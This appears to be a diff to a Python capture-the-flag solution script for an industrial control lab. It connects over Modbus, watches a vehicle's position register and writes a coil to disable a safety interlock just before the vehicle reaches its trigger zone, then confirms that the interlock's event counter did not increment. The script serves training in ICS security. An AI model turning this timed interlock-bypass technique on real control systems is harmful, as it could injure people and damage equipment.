@@ -28,23 +28,64 @@ def main():
         print("[!] Connection failed")
         sys.exit(1)
 
-    print("[*] CTF Challenge 4: Safety Bypass")
-    print("[*] Disabling Event 2 (Safety Interlock)...")
+    print("[*] CTF Challenge 5: Safety Bypass")
+    print("[*] Event 2 (Safety Interlock) triggers at position 3")
+    print("[*] Waiting for vehicle to approach Event 2 zone...")
 
-    # Disable Event 2 before entering its zone
-    client.write_coil(9, False)  # event_2_enable
-    print("[+] Event 2 disabled!")
-    print("[*] Safety interlock bypassed!")
-    print("[*] Monitoring for errors...")
+    # Wait for vehicle to get close to Event 2 zone, then disable it
+    timeout = 60
+    start_time = time.time()
+    safety_bypassed = False
+    last_position = -1
 
-    for i in range(10):
-        time.sleep(1)
-        error = client.read_holding_registers(1029, 1)  # last_error_code
-        if not error.isError():
-            print(f"\r[*] Error code: {error.registers[0]:3d}", end="", flush=True)
+    while not safety_bypassed and (time.time() - start_time) < timeout:
+        # Read current position
+        pos_result = client.read_holding_registers(1, 1)  # current_position
+        if not pos_result.isError():
+            current_pos = pos_result.registers[0]
 
-    print("\n\n[+] Safety bypass successful!")
-    print("[*] Check the web interface for flag capture notification")
+            if current_pos != last_position:
+                print(f"\r[*] Vehicle position: {current_pos}", end="", flush=True)
+                last_position = current_pos
+
+            # When approaching Event 2 zone (position 3), disable it
+            if current_pos >= 1 and current_pos <= 2 and not safety_bypassed:
+                print("\n[*] Vehicle approaching Event 2 zone - disabling safety interlock...")
+                client.write_coil(9, False)  # event_2_enable
+                print("[+] Event 2 disabled!")
+
+            # Check if vehicle passed through Event 2 zone
+            if current_pos == 3:
+                verify = client.read_coils(9, 1)  # event_2_enable
+                if not verify.isError() and not verify.bits[0]:
+                    print("\n[+] Vehicle at Event 2 zone (position 3) - Safety interlock is DISABLED!")
+
+                    # Check event counter to confirm it didn't trigger
+                    counter_before = client.read_holding_registers(1045, 1)  # event_2_counter
+                    time.sleep(2)  # Wait while in zone
+                    counter_after = client.read_holding_registers(1045, 1)
+
+                    if not counter_before.isError() and not counter_after.isError():
+                        before = counter_before.registers[0]
+                        after = counter_after.registers[0]
+                        print(f"[*] Event 2 counter: {before} -> {after}")
+
+                        if after == before:
+                            print("[+] Safety check successfully bypassed - counter did not increment!")
+                            safety_bypassed = True
+
+            # Exit after passing Event 2 zone
+            if current_pos > 4 and safety_bypassed:
+                break
+
+        time.sleep(0.2)
+
+    if safety_bypassed:
+        print("\n\n[+] Challenge condition met!")
+        print("[*] Safety interlock was bypassed when vehicle entered its trigger zone")
+        print("[*] Check the web interface for flag capture notification")
+    else:
+        print("\n\n[!] Timeout or safety check was not properly bypassed")
     client.close()
 
 if __name__ == "__main__":
